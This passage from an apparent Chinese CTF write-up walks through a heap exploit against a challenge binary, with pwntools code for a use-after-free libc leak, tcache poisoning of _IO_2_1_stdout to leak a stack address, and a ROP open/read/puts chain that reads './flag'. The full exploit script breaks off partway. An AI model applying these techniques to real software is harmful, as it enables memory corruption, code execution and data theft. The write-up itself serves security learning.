punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>uaf<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>env <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>接下来进行堆拓展攻击</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#置入 unsortedbin 内</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#此时 unsortedbin 内包含这 tcache</span></pre></td></tr></table></figure><p><img data-src=\"D:/%E7%AC%94%E8%AE%B0/picture/Untitled/image-20240621151328883.png\" alt=\"image-20240621151328883\"></p>\n<p>此时我们去申请一个 chunk 使其从 unsortedbin 拿取。所以申请个 0x70（size&lt;0x110 且不能等于 0x80</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#此时就会修改 tcache 的 fd 指针   #2</span></pre></td></tr></table></figure><p>然后此时再去申请 0x80 的 chunk 就可以得到 _IO_2_1_stdout 的 chunk</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfdab1800</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4</span></pre></td></tr></table></figure><blockquote>\n<p>pwndbg&gt; dps 0x7ffff7fc26a0<br>\n00:0000│ rsi 0x7ffff7fc26a0 (<em>IO_2_1_stdout</em>) ◂— 0xfdab1800<br>\n01:0008│     0x7ffff7fc26a8 (<em>IO_2_1_stdout</em>+8) ◂— 0x0<br>\n… ↓        2 skipped<br>\n04:0020│     0x7ffff7fc26c0 (<em>IO_2_1_stdout</em>+32) —▸ 0x7ffff7fc4600 (environ) —▸ 0x7fffffffdef8 —▸ 0x7fffffffe25e ◂— ‘SHELL=/bin/bash’<br>\n05:0028│     0x7ffff7fc26c8 (<em>IO_2_1_stdout</em>+40) —▸ 0x7ffff7fc4608 ◂— 0x0<br>\n06:0030│     0x7ffff7fc26d0 (<em>IO_2_1_stdout</em>+48) —▸ 0x7ffff7fc4608 ◂— 0x0<br>\n07:0038│     0x7ffff7fc26d8 (<em>IO_2_1_stdout</em>+56) —▸ 0x7ffff7fc2723 (<em>IO_2_1_stdout</em>+131) ◂— 0xfc37e0000000000a /* ‘\\n’ */</p>\n</blockquote>\n<p>此时只要去执行一次 puts 或者 prinf 就可以泄露栈地址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000023b6a</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>pop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002601f</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>pop_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000142c92</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sendfile_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'sendfile'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>puts <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> stack_addr</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'./flag\\x00\\x00'</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># open('./flag', 0)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>open_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># read(3, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># write(1, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(stack_addr - 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(write_addr)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(3) + p64(pop_rdx_ret) + p64(0) + p64(sendfile_addr)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>再次利用堆拓展攻击，申请到栈上，劫持返回地址进行 orw 即可</p>\n<h2 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># host, port = \"47.103.122.127:30175\".split(\":\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote(host, int(port))</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Choice: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input size: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input content: \\n\"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># only one</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">uaf</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\"># only one</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add_</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input size: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input content: \"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele_</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#0-8</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#9</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#0-6</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>uaf<span class=\"token 